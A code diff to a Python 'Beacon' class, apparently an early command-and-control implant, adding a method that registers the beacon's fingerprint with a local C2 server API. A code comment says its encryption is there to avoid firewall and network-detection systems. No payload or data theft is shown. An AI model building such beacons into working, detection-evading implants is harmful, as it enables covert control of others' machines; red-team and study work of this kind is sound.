@@ -1,6 +1,7 @@
 import json
 import uuid
 import os
+import urllib3
 
 # Encryption libraries to prevent Firewall and NDS Detection
 from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
@@ -33,9 +34,16 @@ class Beacon:
         self.private_key_hex = private_key.private_bytes_raw().hex()
         self.public_key_hex = public_key.public_bytes_raw().hex()
 
+    def register_beacon(self):
+        initial_registration_request = urllib3.request("POST", "http://127.0.0.1:4999/api/register/start", json=self.beacon_fingerprint)
+
+        print(initial_registration_request.data)
+        
+
 
 b1 = Beacon()
 
 print(b1.beacon_fingerprint)
 b1.generate_key_pairs()
-print(b1.private_key_hex)
+
+b1.register_beacon()
